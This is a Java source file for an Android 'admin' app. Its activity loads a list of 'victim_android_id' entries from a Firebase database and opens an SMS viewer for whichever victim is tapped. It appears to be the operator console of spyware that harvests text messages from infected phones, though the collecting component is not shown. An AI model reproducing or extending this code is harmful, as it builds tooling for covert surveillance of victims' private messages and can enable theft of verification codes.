package com.itsolution.adminapp;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.ActionBar;
import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.view.WindowManager;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.ListView;

import com.google.firebase.database.ChildEventListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.ArrayList;
import java.util.HashMap;

public class send_message_victim_id extends AppCompatActivity {

    DatabaseReference db_send_or_not;

    DatabaseReference databaseReference= FirebaseDatabase.getInstance().getReference("victim_android_id");
    ListView listview;
    ArrayList<String> myarrayList=new ArrayList<>();
    DatabaseReference db;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_send_message_victim_id);

        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,WindowManager.LayoutParams.FLAG_FULLSCREEN);
        ActionBar actionBar;
        actionBar = getSupportActionBar();
        actionBar.hide();



        ArrayAdapter<String> myArrayadapter=new ArrayAdapter<String>(send_message_victim_id.this, android.R.layout.simple_list_item_1,myarrayList);
        listview=findViewById(R.id.android_id);
        listview.setAdapter(myArrayadapter);



        Object fieldsObj = new Object();
        HashMap fldObj;

        databaseReference.addChildEventListener(new ChildEventListener() {
            @Override
            public void onChildAdded(@NonNull DataSnapshot snapshot, @Nullable String previousChildName) {
                String value = (String) snapshot.getKey();
                myarrayList.add(value);
                myArrayadapter.notifyDataSetChanged();
            }

            @Override
            public void onChildChanged(@NonNull DataSnapshot snapshot, @Nullable String previousChildName) {
                myArrayadapter.notifyDataSetChanged();
            }

            @Override
            public void onChildRemoved(@NonNull DataSnapshot snapshot) {

            }

            @Override
            public void onChildMoved(@NonNull DataSnapshot snapshot, @Nullable String previousChildName) {

            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        });

        listview.setOnItemClickListener(new AdapterView.OnItemClickListener() {
            @Override
            public void onItemClick(AdapterView<?> adapterView, View view, int i, long l) {
                String selectedFromList = (String) (listview.getItemAtPosition(i));

                Intent intent=new Intent(send_message_victim_id.this,sms_view.class);
                intent.putExtra("android_id",selectedFromList);
                startActivity(intent);


            }
        });

    }

}
